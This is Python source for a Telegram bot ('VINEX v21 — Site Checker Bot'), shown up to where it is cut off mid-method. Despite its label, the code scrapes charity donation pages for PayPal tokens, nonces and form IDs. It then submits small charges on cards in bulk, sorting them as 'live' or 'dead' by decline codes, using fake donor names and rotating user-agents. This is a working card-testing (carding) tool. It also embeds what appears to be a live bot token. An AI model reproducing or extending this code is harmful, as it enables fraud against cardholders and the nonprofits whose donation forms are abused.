#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║   ██╗   ██╗██╗███╗   ██╗███████╗██╗  ██╗                     ║
# ║   ██║   ██║██║████╗  ██║██╔════╝╚██╗██╔╝                     ║
# ║   ██║   ██║██║██╔██╗ ██║█████╗   ╚███╔╝                      ║
# ║   ╚██╗ ██╔╝██║██║╚██╗██║██╔══╝   ██╔██╗                      ║
# ║    ╚████╔╝ ██║██║ ╚████║███████╗██╔╝ ██╗                     ║
# ║     ╚═══╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝                     ║
# ║                                                              ║
# ║   VINEX v21 — Site Checker Bot                               ║
# ║   Playful • Bold • Precise • Reliable                        ║
# ╚══════════════════════════════════════════════════════════════╝
import telebot
from telebot import types
import telebot.apihelper
import time
import threading
import os
import re
import json
import base64
import random
import logging
import tempfile
from string import Template
from collections import defaultdict
from urllib.parse import urlparse

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    _UU = UserAgent(
        fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120'
    )
    def rand_ua():
        try:
            return _UU.random
        except Exception:
            return 'Mozilla/5.0'
except Exception:
    def rand_ua():
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'

# ═════════════════════════════════════════════════════════════════
#  🌐 VINEX GLOBAL TIMEOUTS (Railway-safe)
# ═════════════════════════════════════════════════════════════════
telebot.apihelper.CONNECT_TIMEOUT = 30
telebot.apihelper.READ_TIMEOUT = 180

# ═════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════
TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
ADMINS = {str(OWNER_ID)}

USERS_FILE = 'users.txt'
BLOCK_FILE = 'blockusers.txt'
STATS_FILE = 'stats.json'
PROGRESS_TMPL = 'progress_{}.json'
RESULTS_TMPL = 'vinex_results_{}_{}.txt'
LIVE_DIR_TMPL = 'vinex_live_{}_{}'

MAX_FILE_SIZE = 10 * 1024 * 1024
PAYPAL_COOLDOWN = 3
MASS_COOLDOWN = 10
LINK_COOLDOWN = 30
PROGRESS_SAVE_EVERY = 10
STATUS_UPDATE_EVERY = 2.0
CLEANUP_OLDER_THAN_DAYS = 7
NONCE_REFRESH_INTERVAL = 50

BASE_AMOUNTS = ['1.00', '3.00', '5.00']
TEST_CARD = os.getenv('TEST_CARD', '4059986126444431|11|30|947')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('vinex.log', encoding='utf-8'),
        logging.StreamHandler(),
    ],
)
log = logging.getLogger('vinex')
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

# ═════════════════════════════════════════════════════════════════
#  🎨 VINEX BRANDING
# ═════════════════════════════════════════════════════════════════
VINEX_LOGO = '🌟 <b>VINEX</b> 🌟'
VINEX_TAG = '<i>Site Scanner v21</i>'

def vinex_header(subtitle=''):
    """Bold vinex header."""
    lines = [
        '╔══════════════════════════╗',
        f'║  {VINEX_LOGO}  ║',
        f'║     {VINEX_TAG}     ║',
        '╚══════════════════════════╝',
    ]
    if subtitle:
        lines.append(f'<b>▸ {subtitle}</b>')
    return '\n'.join(lines)

def vinex_footer():
    return '╚══════════════════════════╝'

def playful(kind):
    """Playful emoji + message."""
    pool = {
        'start': ['🚀', '🎯', '⚡', '🔥'],
        'working': ['⚙️', '🔄', '🧠', '⚡', '🌀'],
        'success': ['🎉', '✨', '💫', '🎊', '🏆'],
        'dead': ['💀', '😴', '🥀', '❌'],
        'live': ['💎', '💚', '💛', '🏆'],
        'error': ['⚠️', '🚨', '💢'],
        'fun': ['😎', '🤙', '👑', '🦾', '😏'],
    }
    return random.choice(pool.get(kind, ['•']))

# ═════════════════════════════════════════════════════════════════
#  🎨 COLORED BUTTONS (emoji-based — real Telegram way)
# ═════════════════════════════════════════════════════════════════
def vinex_btn(label, style='primary', **kwargs):
    """
    Colored button via emoji prefix.
    Telegram API has no native color — this is the only real way.
    style: success=🟢  primary=🔵  danger=🔴  warning=🟡  gold=⭐
    """
    icons = {
        'success': '🟢',
        'primary': '🔵',
        'danger':  '🔴',
        'warning': '🟡',
        'gold':    '⭐',
        'info':    'ℹ️',
    }
    icon = icons.get(style, '⚪')
    return types.InlineKeyboardButton(f'{icon} {label}', **kwargs)

# ═════════════════════════════════════════════════════════════════
#  STATE
# ═════════════════════════════════════════════════════════════════
waiting_users = {}
reply_mode = {}
mass_active = {}
mass_pause = {}
user_last_paypal = defaultdict(float)
user_last_mass = defaultdict(float)
link_cooldowns = {}

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f):
            open(_f, 'w', encoding='utf-8').close()
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════
#  🔧 RESPONSE EXTRACTOR
# ═════════════════════════════════════════════════════════════════
def extract_response_text(body):
    if not body:
        return ''
    s = str(body).strip()
    if not s:
        return ''
    try:
        j = json.loads(s)
        if isinstance(j, dict):
            d = j.get('data')
            if isinstance(d, dict):
                details = d.get('details')
                if isinstance(details, list) and details and isinstance(details[0], dict):
                    for k in ('description', 'issue', 'reason'):
                        v = details[0].get(k)
                        if v and str(v).strip().lower() not in ('none', 'null', ''):
                            return str(v)[:300]
                for k in ('error', 'message', 'msg', 'reason', 'detail', 'description', 'name'):
                    v = d.get(k)
                    if v and str(v).strip().lower() not in ('none', 'null', 'false', ''):
                        return str(v)[:300]
            elif isinstance(d, str) and d.strip() and d.lower() not in ('none', 'null'):
                return d[:300]
            details = j.get('details')
            if isinstance(details, list) and details and isinstance(details[0], dict):
                for k in ('description', 'issue', 'reason'):
                    v = details[0].get(k)
                    if v and str(v).strip().lower() not in ('none', 'null', ''):
                        return str(v)[:300]
            for k in ('error', 'message', 'msg', 'detail', 'reason', 'description'):
                v = j.get(k)
                if v and str(v).strip().lower() not in ('none', 'null', '', 'false'):
                    return str(v)[:300]
            nm = j.get('name')
            if nm:
                return str(nm)[:300]
        elif isinstance(j, str) and j.strip() and j.lower() not in ('none', 'null'):
            return j[:300]
        elif isinstance(j, list) and j:
            return str(j[0])[:300]
    except Exception:
        pass
    return s[:300]

# ═════════════════════════════════════════════════════════════════
#  🧹 OPTION FILTER
# ═════════════════════════════════════════════════════════════════
_JUNK_PATTERNS = ['give-', 'screen-reader', 'give-label', 'give-required',
                  'give-where', 'give_price', 'give-form-']
_JUNK_EXACT = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}

def is_valid_option(opt):
    if not opt or not isinstance(opt, str):
        return False
    o = opt.strip()
    if not o:
        return False
    lo = o.lower()
    if lo in _JUNK_EXACT:
        return False
    for pat in _JUNK_PATTERNS:
        if pat in lo:
            return False
    if len(o) > 60:
        return False
    if o.startswith(('{', '[', '<')):
        return False
    return True

# ═════════════════════════════════════════════════════════════════
#  🎯 CLASSIFICATION
# ═════════════════════════════════════════════════════════════════
RETRY_ON_AUTH = [
    'AUTHENTICATION_FAILURE', 'AUTHENTICATION_FAILED',
    'INVALID_TOKEN', 'TOKEN_EXPIRED', 'NOT_AUTHORIZED',
    'INVALID_CLIENT', 'INVALID_NONCE',
]

CARD_DECLINE_PATTERNS = [
    'INSTRUMENT_DECLINED', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
    'Payer has not yet approved', 'Payer cannot pay',
    'PAYMENT_DENIED', 'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS',
    'CVV_FAILURE', 'CVV2_FAILURE', 'INVALID_OR_RESTRICTED',
    'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED', 'EXPIRED_CARD',
    'CARD_EXPIRED', 'TRANSACTION_NOT_PERMITTED', 'GENERIC_DECLINE',
    'TRANSACTION_REFUSED', 'AUTHORIZATION_DENIED',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'LOST_OR_STOLEN', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'SECURITY_VIOLATION',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED',
    'AMOUNT_MISMATCH', 'CURRENCY_MISMATCH', 'POSTAL_CODE_REQUIRED',
    'DECLINED_PLEASE_RETRY', 'REATTEMPT_NOT_PERMITTED',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACTION_REQUIRED',
    'PAYEE_NOT_CONSENTED', 'PERMISSION_DENIED', 'INVALID_ACCOUNT_STATUS',
    'REFERENCED_CARD_EXPIRED', 'INVALID_EXPIRATION',
    'INVALID_CARD_VERIFICATION_VALUE', 'INVALID_TRANSACTION',
    'DUPLICATE_TRANSACTION', 'CARD_CLOSED', 'UNAUTHORIZED_USER',
    'AVS_FAILURE', 'SOFT_AVS', 'INCORRECT_PIN_REENTER', 'INVALID_PIN',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ACCOUNT_NOT_ON_FILE',
    'INVALID_ACCOUNT', 'DECLINED',
]

INFRA_FAILURE_PATTERNS = [
    'HTTP_403', 'HTTP_404', 'HTTP_500', 'HTTP_502', 'HTTP_503',
    'JSON_ERR', 'EXC_', 'NETWORK:', 'FETCH_FAILED',
    'INVALID_FORM', 'FORM_NOT_FOUND', 'NONCE_MISSING',
    'FORM_ERROR', 'INVALID_SITE', 'BAD_URL',
    'INVALID_CARD_FORMAT', 'INVALID_EXPIRY_MONTH', 'INVALID_CVV',
    'INVALID_CARD_NUMBER',
]

def is_card_decline(resp):
    if not resp:
        return False
    up = str(resp).upper()
    return any(p.upper() in up for p in CARD_DECLINE_PATTERNS)

def is_infra_failure(resp):
    if not resp:
        return False
    up = str(resp).upper()
    return any(p.upper() in up for p in INFRA_FAILURE_PATTERNS)

def is_auth_failure(resp):
    if not resp:
        return False
    up = str(resp).upper()
    return any(k in up for k in RETRY_ON_AUTH)

def is_live_response(resp):
    if not resp:
        return False
    up = str(resp).upper()
    if 'CHARGE' in up:
        return True
    if is_card_decline(up):
        return True
    if is_infra_failure(up):
        return False
    if is_auth_failure(up):
        return False
    return False

def is_dead_response(resp):
    if not resp:
        return True
    up = str(resp).upper()
    if 'CHARGE' in up:
        return False
    if is_card_decline(up):
        return False
    return is_infra_failure(up) or is_auth_failure(up)

PRIORITY = [
    ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
    ('INVALID_OR_RESTRICTED_CARD', 190),
    ('TRANSACTION_NOT_PERMITTED', 188),
    ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
    ('Payer has not yet approved', 185),
    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175),
    ('CVV_FAILURE', 175), ('EXPIRED_CARD', 172),
    ('DO_NOT_HONOR', 170), ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
    ('REATTEMPT_NOT_PERMITTED', 160),
    ('ACCOUNT_BLOCKED_BY_ISSUER', 158), ('GENERIC_DECLINE', 155),
    ('TRANSACTION_REFUSED', 153), ('CAPTURE_DECLINED', 145),
    ('AUTHORIZATION_DENIED', 143), ('DECLINED_PLEASE_RETRY', 132),
    ('TX_ATTEMPTS_EXCEED_LIMIT', 130), ('DECLINED', 100),
]

def score_result(resp):
    if not resp:
        return 0
    up = str(resp).upper()
    for k, s in PRIORITY:
        if k.upper() in up:
            return s
    return 1

def normalize_result(resp):
    if not resp:
        return 'DECLINED'
    s = str(resp)
    up = s.upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
       or 'Payer has not yet approved' in s or 'Payer cannot pay' in s:
        return 'Payer cannot pay for this transaction.'
    raw = extract_response_text(s) or s
    if 'card was declined' in raw.lower():
        return 'Your card was declined.'
    if 'There was an issue with your donation' in raw:
        return ('There was an issue with your donation transaction: '
                'Your card was declined.')
    return raw[:250]

# ═════════════════════════════════════════════════════════════════
#  💾 FILE HELPERS
# ═════════════════════════════════════════════════════════════════
def save_user(uid):
    try:
        uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
        if str(uid) not in uids:
            with open(USERS_FILE, 'a', encoding='utf-8') as f:
                f.write(f'{uid}\n')
    except Exception:
        pass

def is_blocked(uid):
    try:
        return str(uid) in [
            l.strip() for l in
            open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines()
            if l.strip()
        ]
    except Exception:
        return False

def load_stats():
    try:
        return json.load(open(STATS_FILE, 'r', encoding='utf-8'))
    except Exception:
        return {'checks': 0, 'live': 0, 'dead': 0}

def save_stats(stats):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats, f)
    except Exception:
        pass

def bump_stat(key):
    try:
        s = load_stats()
        s[key] = s.get(key, 0) + 1
        save_stats(s)
    except Exception:
        pass

def save_progress(uid, data):
    try:
        fd, tmp = tempfile.mkstemp(dir='.', suffix='.json')
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False)
        os.replace(tmp, PROGRESS_TMPL.format(uid))
    except Exception:
        pass

def load_progress(uid):
    try:
        return json.load(open(PROGRESS_TMPL.format(uid), 'r', encoding='utf-8'))
    except Exception:
        return None

def clear_progress(uid):
    try:
        os.remove(PROGRESS_TMPL.format(uid))
    except Exception:
        pass

def cleanup_old_files():
    try:
        cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
        for name in os.listdir('.'):
            try:
                if name.startswith(('vinex_results_', 'vinex_live_')):
                    path = os.path.join('.', name)
                    if os.path.isfile(path) and os.path.getmtime(path) < cutoff:
                        os.remove(path)
            except Exception:
                continue
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════
#  🔗 URL PARSER + DEDUP
# ═════════════════════════════════════════════════════════════════
_URL_RE = re.compile(
    r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?'
    r'(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*'
    r'\.[a-zA-Z]{2,}$'
)

def safe_url(link):
    try:
        if not link or not isinstance(link, str):
            return None
        link = link.strip().strip('"\'` \t\r\n')
        while link and link[-1] in '.,;:!?)]}\'"':
            link = link[:-1]
        if len(link) < 8:
            return None
        low = link.lower()
        if '://none' in low or 'invalid.local' in low:
            return None
        if not link.startswith(('http://', 'https://')):
            link = 'https://' + link.lstrip('/')
        parsed = urlparse(link)
        if not parsed.netloc or not parsed.netloc.strip():
            return None
        host = parsed.netloc.split(':')[0].split('@')[-1]
        if not host or not _URL_RE.match(host):
            return None
        return link
    except Exception:
        return None

def normalize_url_key(url):
    try:
        if not url:
            return ''
        p = urlparse(url.lower().strip())
        host = p.netloc.replace('www.', '')
        path = p.path.rstrip('/') or '/'
        query = p.query.strip()
        return f'{host}{path}?{query}' if query else f'{host}{path}'
    except Exception:
        return str(url).lower().strip()

# ═════════════════════════════════════════════════════════════════
#  📤 TELEGRAM HELPERS (resilient)
# ═════════════════════════════════════════════════════════════════
def retry_call(func, *args, retries=4, delays=(2, 4, 8, 16), **kwargs):
    last_err = None
    for i in range(retries):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_err = e
            err = str(e).lower()
            if any(x in err for x in ('invalid file_id', 'file is too big',
                                       'wrong file_id', 'not found')):
                raise
            log.warning(f'[retry] {func.__name__} #{i+1}: {str(e)[:100]}')
            if i < retries - 1:
                time.sleep(delays[i] if i < len(delays) else delays[-1])
    raise last_err

def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML'):
    for i in range(retries):
        try:
            return bot.send_message(
                cid, text, parse_mode=parse_mode,
                reply_markup=reply_markup,
                disable_web_page_preview=True,
            )
        except Exception as e:
            err = str(e)
            if '429' in err:
                try:
                    w = int(err.split('retry after ')[1].split(')')[0])
                except Exception:
                    w = 30
                time.sleep(min(w, 60))
            elif 'can\'t parse' in err.lower() or 'bad request' in err.lower():
                try:
                    return bot.send_message(
                        cid, re.sub(r'<[^>]+>', '', text)[:4000],
                        reply_markup=reply_markup,
                        disable_web_page_preview=True,
                    )
                except Exception:
                    return None
            elif i < retries - 1:
                time.sleep(1)
            else:
                break
    return None

def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(
                chat_id=cid, message_id=mid, text=text,
                parse_mode='HTML', disable_web_page_preview=True,
            )
        except Exception as e:
            err = str(e)
            if 'not modified' in err:
                return None
            if '429' in err:
                try:
                    w = int(err.split('retry after ')[1].split(')')[0])
                except Exception:
                    w = 30
                time.sleep(min(w, 60))
            elif 'can\'t parse' in err.lower():
                try:
                    return bot.edit_message_text(
                        chat_id=cid, message_id=mid,
                        text=re.sub(r'<[^>]+>', '', text)[:4000],
                    )
                except Exception:
                    return None
            else:
                break
    return None

def safe_send_document(cid, path, caption='', retries=3):
    """3-tier file delivery."""
    try:
        if not os.path.exists(path):
            log.error(f'[vinex_doc] Missing: {path}')
            return None
    except Exception:
        return None

    for i in range(retries):
        try:
            with open(path, 'rb') as f:
                res = bot.send_document(
                    cid, f, caption=caption,
                    parse_mode='HTML', timeout=180,
                )
            if res:
                log.info(f'[vinex_doc] ✅ Tier1: {path}')
                return res
        except Exception as e:
            err = str(e)
            log.error(f'[vinex_doc] Tier1 #{i+1}: {err[:100]}')
            if '429' in err:
                try:
                    w = int(err.split('retry after ')[1].split(')')[0])
                except Exception:
                    w = 30
                time.sleep(min(w, 60))
                continue
            if 'can\'t parse' in err.lower() or 'bad request' in err.lower():
                break
            if i < retries - 1:
                time.sleep(2)

    try:
        plain = re.sub(r'<[^>]+>', '', caption)[:1024]
        with open(path, 'rb') as f:
            res = bot.send_document(cid, f, caption=plain, timeout=180)
        if res:
            log.info(f'[vinex_doc] ✅ Tier2: {path}')
            return res
    except Exception as e:
        log.error(f'[vinex_doc] Tier2: {str(e)[:100]}')

    try:
        with open(path, 'rb') as f:
            res = bot.send_document(cid, f, timeout=180)
        if res:
            log.info(f'[vinex_doc] ✅ Tier3: {path}')
            if caption:
                try:
                    safe_send_message(cid, caption)
                except Exception:
                    pass
            return res
    except Exception as e:
        log.error(f'[vinex_doc] Tier3: {str(e)[:100]}')

    log.error(f'[vinex_doc] ❌ ALL TIERS FAILED: {path}')
    return None

# ═════════════════════════════════════════════════════════════════
#  💳 PAYPAL TESTER
# ═════════════════════════════════════════════════════════════════
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller']

class VinexTester:
    def __init__(self, url):
        url = safe_url(url) or 'https://invalid.local/'
        self.page_url = url
        try:
            p = urlparse(url)
            self.url = p.netloc or 'invalid.local'
            self.inurl = p.path or '/'
            if p.query:
                self.inurl += '?' + p.query
        except Exception:
            self.url = 'invalid.local'
            self.inurl = '/'

        self.paypal = None
        self.client_id = None
        self.donation = '1.00'
        self.minimum = '5.00'
        self.currency = 'USD'
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonce = None
        self.wp_nonce = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.page_html = ''
        self.all_content = ''
        self.auth_method = 'none'
        self.gateway_type = 'unknown'
        self.form_fields = {}
        self.email = f'{random.choice(FIRST_NAMES)}{random.randint(100, 999)}@gmail.com'
        self.r = requests.Session()
        self.r.verify = True
        self.r.headers.update({
            'user-agent': rand_ua(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        })
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()
        self.diagnostics = []
        self.token_candidates = []
        self.token_verified = False
        self._warmed = False

    def _log(self, msg):
        try:
            self.diagnostics.append(f'{time.time():.2f} {msg}')
        except Exception:
            pass

    def _safe_get(self, url, timeout=15, headers=None):
        try:
            if not url or not isinstance(url, str):
                return None
            if not url.startswith(('http://', 'https://')):
                return None
            if '://none' in url.lower():
                return None
            return self.r.get(url, timeout=timeout, headers=headers or {})
        except Exception:
            return None

    def _safe_post(self, url, **kwargs):
        try:
            if not url or not isinstance(url, str):
                return None
            if not url.startswith(('http://', 'https://')):
                return None
            return self.r.post(url, timeout=kwargs.pop('timeout', 20), **kwargs)
        except Exception:
            return None

    def _build_url(self, base, path):
        try:
            if not base or not path:
                return None
            if path.startswith('//'):
                return 'https:' + path
            if path.startswith('/'):
                return f'https://{base}{path}'
            if not path.startswith('http'):
                return f'https://{base}/{path}'
            return path
        except Exception:
            return None

    def _warmup_session(self):
        try:
            if self._warmed:
                return True
            self.r.get(f'https://{self.url}/', timeout=15,
                       headers={'referer': f'https://{self.url}/'})
            time.sleep(0.3)
            self.r.get(self.page_url, timeout=20,
                       headers={'referer': f'https://{self.url}/'})
            self._warmed = True
            return True
        except Exception:
            return False

    def _fetch_page(self):
        for _ in range(2):
            try:
                r = self._safe_get(self.page_url, timeout=20,
                                   headers={'referer': f'https://{self.url}/'})
                if r and r.status_code == 200 and r.text:
                    self.page_html = r.text
                    self.all_content = r.text
                    return True
            except Exception:
                pass
            time.sleep(0.3)
        return False

    def _load_iframes(self):
        try:
            if not self.page_html:
                return
            pat = r'<iframe[^>]*src=["\']([^"\']*(?:give|donation|form|checkout)[^"\']*)["\']'
            for m in re.finditer(pat, self.page_html, re.I):
                try:
                    full = self._build_url(self.url, m.group(1))
                    if not full:
                        continue
                    r = self._safe_get(full, timeout=12)
                    if r and r.status_code == 200 and r.text:
                        self.all_content += '\n' + r.text
                except Exception:
                    continue
        except Exception:
            pass

    def _load_all_js(self):
        try:
            if not self.page_html:
                return
            js_urls = re.findall(
                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']',
                self.page_html,
            )
            prio = [u for u in js_urls if any(
                k in u.lower() for k in
                ('give', 'donation', 'paypal', 'commerce', 'token', 'client')
            )]
            ordered = (prio + [u for u in js_urls if u not in prio])[:20]
            for js_url in ordered:
                try:
                    full = self._build_url(self.url, js_url)
                    if not full:
                        continue
                    r = self._safe_get(full, timeout=6)
                    if r and r.status_code == 200 and r.text:
                        self.all_content += '\n' + r.text
                except Exception:
                    continue
        except Exception:
            pass

    def _deep_js_analysis(self):
        try:
            c = self.all_content
            if not c:
                return
            for m in re.finditer(r'wpApiSettings\s*=\s*\{([^}]+)\}', c):
                block = m.group(1)
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', block)
                if nm and not self.wp_nonce:
                    self.wp_nonce = nm.group(1)
            for m in re.finditer(r'give_global_vars\s*=\s*\{', c):
                start = m.end() - 1
                depth = 0
                end = start
                for i in range(start, min(len(c), start + 5000)):
                    if c[i] == '{':
                        depth += 1
                    elif c[i] == '}':
                        depth -= 1
                        if depth == 0:
                            end = i + 1
                            break
                block = c[start:end]
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', block)
                if nm and not self.nonce:
                    self.nonce = nm.group(1)
                am = re.search(r'"ajax"\s*:\s*"([^"]+)"', block)
                if am and not self.ajax_url:
                    self.ajax_url = am.group(1).replace('\\/', '/')
            for pat in [r'give_paypal_commerce\s*=\s*\{([^}]+)\}']:
                for m in re.finditer(pat, c):
                    block = m.group(1)
                    for key in ['clientToken', 'client_token', 'accessToken']:
                        tm = re.search(rf'"?{key}"?\s*:\s*"([^"]+)"', block)
                        if tm:
                            self._add_candidate(tm.group(1), f'js:{key}')
                    cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', block)
                    if cm and not self.client_id:
                        self.client_id = cm.group(1)
                    mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', block)
                    if mm and not self.paypal:
                        self.paypal = mm.group(1)
        except Exception:
            pass

    def _extract_basic(self):
        try:
            c = self.all_content
            if not c:
                return
            for p in [
                r'name="give-form-id-prefix"\s+value="([^"]+)"',
                r'"give-form-id-prefix"\s*:\s*"([^"]+)"',
            ]:
                m = re.search(p, c)
                if m:
                    self.id_form1 = m.group(1)
                    break
            for p in [
                r'name="give-form-id"\s+value="(\d+)"',
                r'"give-form-id"\s*:\s*"?(\d+)"?',
                r'give-form-(\d+)-',
            ]:
                m = re.search(p, c)
                if m:
                    self.id_form2 = m.group(1)
                    break
            if not self.nonce:
                for p in [
                    r'name="give-form-hash"\s+value="([^"]+)"',
                    r'"give-form-hash"\s*:\s*"([^"]+)"',
                ]:
                    m = re.search(p, c)
                    if m:
                        self.nonce = m.group(1)
                        break
            for p in [
                r'name="give-form-minimum"\s+value="([^"]*)"',
                r'"give-form-minimum"\s*:\s*"([^"]*)"',
            ]:
                m = re.search(p, c)
                if m and m.group(1).strip():
                    self.minimum = m.group(1).strip()
                    break
            for p in [
                r'name="give-currency"\s+value="([A-Za-z]{3})"',
                r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                r'"currency"\s*:\s*"([A-Za-z]{3})"',
            ]:
                m = re.search(p, c, re.I)
                if m:
                    self.currency = m.group(1).upper()
                    break
            if 'admin-ajax.php' in c and not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except Exception:
            pass

    def _extract_all_form_fields(self):
        try:
            c = self.all_content
            if not c:
                return
            self.form_fields = {}
            for m in re.finditer(
                r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>',
                c, re.DOTALL | re.I,
            ):
                try:
                    name = m.group(1)
                    inner = m.group(2)
                    tag = m.group(0)
                    required = 'required' in tag.lower()
                    options = [
                        om.group(1).strip()
                        for om in re.finditer(
                            r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>',
                            inner,
                        )
                        if om.group(1).strip()
                    ]
                    self.form_fields[name] = {
                        'type': 'select',
                        'required': required,
                        'options': options,
                    }
                except Exception:
                    continue
            radio_groups = {}
            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        name = nm.group(1)
                        val = vm.group(1)
                        if name not in radio_groups:
                            radio_groups[name] = {
                                'required': 'required' in tag.lower(),
                                'options': [],
                            }
                        if val and val not in radio_groups[name]['options']:
                            radio_groups[name]['options'].append(val)
                except Exception:
                    continue
            for name, info in radio_groups.items():
                self.form_fields[name] = {
                    'type': 'radio',
                    'required': info['required'],
                    'options': info['options'],
                }
            for m in re.finditer(
                r'<input[^>]*type=["\'](text|email|tel|number|date)["\'][^>]*>',
                c, re.I,
            ):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if nm:
                        name = nm.group(1)
                        if name not in self.form_fields:
                            self.form_fields[name] = {
                                'type': m.group(1).lower(),
                                'required': 'required' in tag.lower(),
                                'options': [],
                            }
                except Exception:
                    continue
        except Exception:
            pass

    def _resolve_dropdown_options(self):
        try:
            for name, info in list(self.form_fields.items()):
                if info.get('options'):
                    cleaned = [o for o in info['options'] if is_valid_option(o)]
                    info['options'] = cleaned
                if info.get('type') != 'select':
                    continue
                if info.get('options'):
                    continue
                if not info.get('required'):
                    continue
                if self.ajax_url and self.id_form2:
                    try:
                        r = self._safe_post(
                            self.ajax_url,
                            data={'action': 'give_get_form_field_options',
                                  'field_name': name, 'form_id': self.id_form2},
                            timeout=6,
                        )
                        if r and r.status_code == 200:
                            j = r.json()
                            if isinstance(j.get('data'), list) and j['data']:
                                valid = [o for o in j['data'] if is_valid_option(o)]
                                if valid:
                                    info['options'] = valid
                                    continue
                    except Exception:
                        pass
                info['required'] = False
        except Exception:
            pass

    def _resolve_special_fields(self):
        try:
            country = 'US'
            for fname in ('billing_country', 'give_country', 'country'):
                if fname in self.form_fields:
                    opts = [o for o in self.form_fields[fname].get('options', [])
                            if is_valid_option(o)]
                    if opts:
                        country = opts[0]
                        break
            special = {
                'last_4_digits_nricfin': str(random.randint(1000, 9999)),
                'contact_number_to_collect': '+6581234567' if country == 'SG' else '+1234567890',
            }
            for name, value in special.items():
                if name in self.form_fields:
                    self.form_fields[name]['prefill'] = value
        except Exception:
            pass

    def _add_candidate(self, token, source):
        if not token or len(token) < 20:
            return
        for c in self.token_candidates:
            if c['token'] == token:
                return
        self.token_candidates.append({'token': token, 'source': source})

    def _extract_tokens_ultimate(self):
        try:
            c = self.all_content
            if not c:
                return False
            for p in [
                r'"data-client-token"\s*:\s*"([^"]+)"',
                r'data-client-token=["\']([^"\']+)["\']',
                r'"clientToken"\s*:\s*"([^"]+)"',
            ]:
                for m in re.finditer(p, c, re.I):
                    try:
                        enc = m.group(1)
                        padded = enc + '=' * (-len(enc) % 4)
                        dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                        tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                        if tm:
                            self._add_candidate(tm.group(1), 'b64')
                        mm = re.search(r'merchant_id=([\w]+)', dec)
                        if mm and not self.paypal:
                            self.paypal = mm.group(1)
                        cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', dec)
                        if cm and not self.client_id:
                            self.client_id = cm.group(1)
                    except Exception:
                        pass
            for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', c, re.I):
                if len(m.group(1)) > 20:
                    self._add_candidate(m.group(1), 'direct')
